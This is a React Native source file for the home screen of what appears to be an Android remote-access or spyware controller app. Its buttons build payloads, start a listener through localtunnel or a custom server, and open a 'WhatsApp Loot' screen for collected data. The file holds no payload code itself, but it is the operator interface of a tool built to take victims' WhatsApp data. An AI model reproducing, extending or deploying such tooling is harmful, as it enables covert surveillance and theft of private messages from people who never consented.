import React, { useEffect, useState } from "react";
import { PermissionsAndroid, Linking } from 'react-native';
import { 
    Box,
    StatusBar, 
    Icon,
    Button,
    useToast
} from "native-base";
import nodejs from 'nodejs-mobile-react-native';
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { setListening } from '../../redux/slices/userInfo'

// components
import ConnectingScreen from '../../components/ConnectingScreen'
//test
import AppBuilder from '../../native-modules/AppBuilder'
import CustomServerConfigScreen from "../../components/CustomServerConfigScreen";

const Home = ({navigation}) => {
  const [visible, setVisible]= useState(false);
  const [visible2, setVisible2]= useState(false);
  const dispatch = useDispatch();
  const toast = useToast();
  const { subdomain, isListening } = useSelector((state) => state.userInfo);
  useEffect(()=>{
    nodejs.channel.addListener("log",(log) => console.log(log), this);
    nodejs.channel.addListener("listnerStarted", onlistnerStart, this);
  },[])


  const handleStartLister =async()=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
    if (granted) {
      setVisible(true);
      nodejs.channel.post('startListener',subdomain)
    }else{
     requestPermission();
    }
  }
  const handleStopLister = ()=>{
    AppBuilder.sshTunnelDisconnect((e,m)=>console.log(m));
    nodejs.channel.post('stopListener')
    dispatch(setListening(false))
  }
  const onlistnerStart = ()=>{
    dispatch(setListening(true))
    navigation.navigate('dashboard')
    setVisible(false);
  }
  const handleAppBuilder = ()=>{
    navigation.navigate('payloadOptions')
  }
  const handleLoot = async()=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
      navigation.navigate('loot')
     }else{
      requestPermission();
     }
  }

  async function requestPermission() 
   { 
     try {
          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE)
          if (granted!== PermissionsAndroid.RESULTS.GRANTED) {
               toast.show({ title: "Permission not granted", status: "error",placement: "top",description: "Please grant permission"})
          } 
        } catch (err) { } 
   }
  

  
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>

    <Box flex={1} justifyContent={"center"} bg={"primary"} px={'10'} >
    <Button variant={'subtle'} onPress={handleAppBuilder} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build Payloads'}
    </Button>
    {!isListening&&<><Button onPress={handleStartLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
     {'Start Listening (localtunnel server)'}
    </Button>
    <Button onPress={()=>setVisible2(true)} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
     {'Start Listening (custom server)'}
    </Button></>}
    {isListening&&<Button onPress={handleStopLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
     {'Stop Listening'}
    </Button>}
    <Button onPress={handleLoot} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'WhatsApp Loot'}
    </Button>
    </Box>
    <ConnectingScreen visible={visible} title={"Please wait, Forwarding port.."}/>
    <CustomServerConfigScreen visible={visible2} setVisible={setVisible2}/>
    </>
    )
};

export default Home;

  